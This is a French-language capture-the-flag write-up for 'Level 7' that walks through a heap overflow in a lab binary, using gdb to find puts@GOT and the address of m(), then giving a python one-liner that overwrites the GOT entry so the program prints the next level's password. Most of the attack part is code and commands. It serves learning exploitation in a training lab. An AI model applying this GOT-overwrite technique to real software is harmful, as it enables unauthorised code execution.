# Level 7 - Heap overflow et GOT overwrite

## 1. Analyse du binaire
```c
int m()
{
  time_t v0;
  v0 = time(0);
  return printf("%s - %d\n", c, v0);  // c contient le flag
}

int main(int argc, const char **argv)
{
  void *v5;
  void *v6;

  v6 = malloc(8);                    // Premier bloc
  *(_DWORD *)v6 = 1;                // Met 1 dans les 4 premiers bytes
  *((_DWORD *)v6 + 1) = malloc(8);  // Second bloc, adresse stockée dans les 4 derniers bytes

  v5 = malloc(8);                    // Troisième bloc
  *(_DWORD *)v5 = 2;                // Met 2 dans les 4 premiers bytes
  *((_DWORD *)v5 + 1) = malloc(8);  // Quatrième bloc, adresse stockée dans les 4 derniers bytes

  strcpy(*((char **)v6 + 1), argv[1]);  // Copie argv[1] dans le second bloc
  strcpy(*((char **)v5 + 1), argv[2]);  // Copie argv[2] dans le quatrième bloc

  fopen("/home/user/level8/.pass", "r");
  fgets(c, 68, v3);
  puts("~~");
}
```

## 2. Recherche des adresses importantes
```bash
# Adresse de puts dans la GOT
(gdb) info function puts
0x08048400  puts@plt
(gdb) x/i 0x08048400
0x8048400 <puts@plt>:	jmp    DWORD PTR ds:0x8049928
# puts@GOT = 0x8049928

# Adresse de la fonction m
(gdb) info function m
0x080484f4  m
```

## 3. Trouver l'offset du buffer overflow
```bash
# Test avec un pattern
(gdb) r 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ' 'test'
# Analyse des registres
(gdb) i r
# On voit que l'overflow se produit après 20 caractères
```

## 4. Structure en mémoire
```
État initial :
v6 →  [    1    ][adresse_malloc2]
                  ↓
                  [zone pour argv[1]]

v5 →  [    2    ][adresse_malloc4]
                  ↓
                  [zone pour argv[2]]

Après overflow de argv[1] :
v6 →  [    1    ][adresse_malloc2]
                  ↓
                  [AAAA...AAAA][puts@GOT]
                   20 bytes
                              ↓
v5 →  [    2    ][puts@GOT]
```

Quand le deuxième strcpy est exécuté :
- Il va écrire argv[2] à l'adresse stockée dans v5+4
- Comme on a écrasé cette adresse avec puts@GOT
- argv[2] (qui contient l'adresse de m()) sera écrit dans la GOT de puts

## 5. Construction de l'exploit
- Premier argument (argv[1]) :
  - 20 bytes de padding
  - Adresse de puts@GOT (0x8049928)
- Deuxième argument (argv[2]) :
  - Adresse de m() (0x80484f4)

```bash
./level7 $(python -c 'print "a"*20+"\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
```

## 6. Explication de l'exploit
1. Le premier strcpy écrit :
   - 20 'a' dans le second bloc
   - L'adresse de puts@GOT (0x8049928) écrase le pointeur dans v5
2. Le deuxième strcpy :
   - Au lieu d'écrire dans le quatrième bloc
   - Écrit dans la GOT de puts
   - Y met l'adresse de m() (0x80484f4)
3. Quand puts("~~") est appelé :
   - Le programme cherche l'adresse dans la GOT
   - Trouve l'adresse de m()
   - Exécute m() qui affiche le flag
```
